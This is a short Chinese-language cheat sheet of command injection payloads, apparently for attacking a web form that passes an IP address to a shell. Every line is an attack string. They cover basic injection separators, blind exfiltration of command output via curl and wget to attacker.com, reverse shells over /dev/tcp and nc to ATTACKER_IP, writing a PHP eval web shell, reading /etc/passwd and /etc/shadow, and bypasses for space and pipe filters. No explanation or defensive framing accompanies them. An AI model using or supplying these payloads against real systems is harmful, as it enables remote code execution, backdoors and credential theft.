命令注入参考 Payload
# 1. 基础命令注入
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami

# 2. 无回显命令注入（DNS外带）
127.0.0.1; curl http://attacker.com/$(whoami)
127.0.0.1; wget http://attacker.com/?q=$(id)

# 3. 反弹 Shell
# Kali 监听: nc -lvnp 4444
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
127.0.0.1; nc -e /bin/bash ATTACKER_IP 4444

# 4. 文件写入
127.0.0.1; echo '<?php eval($_POST[cmd]); ?>' > /tmp/shell.php

# 5. 读取敏感文件
127.0.0.1; cat /etc/passwd
127.0.0.1; cat /etc/shadow

# 6. 绕过过滤
# 空格过滤:
127.0.0.1;cat${IFS}/etc/passwd
127.0.0.1;{cat,/etc/passwd}
127.0.0.1;cat</etc/passwd

# 管道符过滤:
127.0.0.1;whoami
127.0.0.1`whoami`
127.0.0.1$(whoami)
